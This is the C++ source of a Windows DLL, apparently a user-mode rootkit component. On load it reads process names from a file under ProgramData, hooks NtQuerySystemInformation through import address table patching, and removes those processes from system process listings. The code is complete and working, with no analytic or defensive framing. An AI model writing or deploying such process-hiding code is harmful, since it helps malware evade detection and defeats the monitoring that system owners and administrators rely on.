// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <psapi.h>
#include <TlHelp32.h>
#include <Windows.h>
#include <winternl.h>
#include <unordered_set>
#include <fstream>
#include <string>

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)


std::unordered_set<std::wstring> procNames;
void LoadHiddenProcesses() {
    try {
        std::ifstream file(L"C:\\ProgramData\\cwl\\c\\incl.t");

        if (file.good()) {
            std::string fileContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
            //MessageBox(NULL, std::wstring(fileContent.begin(), fileContent.end()).c_str(), L"procName", MB_OK);

            file.close();

            size_t pos = 0;
            std::wstring procName;
            std::wstring fileContentW(fileContent.begin(), fileContent.end());
            while ((pos = fileContentW.find(L";")) != std::wstring::npos) {
                procName = fileContentW.substr(0, pos);
                procNames.insert(procName);
                //MessageBox(NULL, procName.c_str(), L"procName", MB_OK);

                fileContentW.erase(0, pos + 1);
            }
            // Handle the last process name (if any)
            if (!fileContentW.empty()) {
                procName = fileContentW;
                procNames.insert(procName);
                //MessageBox(NULL, procName.c_str(), L"procName", MB_OK);
            }
        }
        else {
            //MessageBox(NULL, L"filenot good", L"procName", MB_OK);
        }
    }
    catch (...) {}
}

typedef NTSTATUS(WINAPI* PNT_QUERY_SYSTEM_INFORMATION)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );

PNT_QUERY_SYSTEM_INFORMATION origNtQuerySysInfo = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");


NTSTATUS WINAPI hookNtQuerySysInfo(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
) {
    NTSTATUS status = origNtQuerySysInfo(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
    {
        SYSTEM_PROCESS_INFORMATION* pCurrent = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;

        while (pCurrent->NextEntryOffset != 0) {
            SYSTEM_PROCESS_INFORMATION* pNext = (SYSTEM_PROCESS_INFORMATION*)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
            bool isHidden = false;
            for (const auto& procName : procNames) {
                if (wcsncmp(pNext->ImageName.Buffer, procName.c_str(), pNext->ImageName.Length) == 0) {
                    isHidden = true;
                    break;
                }
            }

            if (isHidden) {
                pCurrent->NextEntryOffset += pNext->NextEntryOffset;
            }
            else {
                pCurrent = pNext;
            }
        }
    }
    return status;
}


DWORD WINAPI main(HMODULE hModule) {

    MODULEINFO modInfo;
    GetModuleInformation(GetCurrentProcess(), GetModuleHandle(0), &modInfo, sizeof(MODULEINFO));

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)modInfo.lpBaseOfDll;
    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)((BYTE*)modInfo.lpBaseOfDll + dosHeader->e_lfanew);
    IMAGE_OPTIONAL_HEADER optionalHeader = (IMAGE_OPTIONAL_HEADER)(ntHeader->OptionalHeader);
    IMAGE_IMPORT_DESCRIPTOR* importDescriptor = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)(modInfo.lpBaseOfDll) + optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    while (importDescriptor->Characteristics) {
        if (strcmp("ntdll.dll", (char*)((BYTE*)modInfo.lpBaseOfDll + importDescriptor->Name)) == 0) {
            break;
        }
        importDescriptor++;
    }

    IMAGE_THUNK_DATA* tableEntry = (IMAGE_THUNK_DATA*)((BYTE*)modInfo.lpBaseOfDll + importDescriptor->OriginalFirstThunk);
    IMAGE_THUNK_DATA* IATEntry = (IMAGE_THUNK_DATA*)((BYTE*)modInfo.lpBaseOfDll + importDescriptor->FirstThunk);
    IMAGE_IMPORT_BY_NAME* funcName;

    while (!(tableEntry->u1.Ordinal & IMAGE_ORDINAL_FLAG) && tableEntry->u1.AddressOfData) {
        funcName = (IMAGE_IMPORT_BY_NAME*)((BYTE*)modInfo.lpBaseOfDll + tableEntry->u1.AddressOfData);
        if (strcmp("NtQuerySystemInformation", (char*)(funcName->Name)) == 0) {
            break;
        }
        tableEntry++;
        IATEntry++;
    }

    DWORD oldProt;
    VirtualProtect(&(IATEntry->u1.Function), sizeof(uintptr_t), PAGE_READWRITE, &oldProt);
    IATEntry->u1.Function = (uintptr_t)hookNtQuerySysInfo;
    VirtualProtect(&(IATEntry->u1.Function), sizeof(uintptr_t), oldProt, &oldProt);
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        LoadHiddenProcesses();
        CloseHandle(CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)main, hModule, 0, nullptr));
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

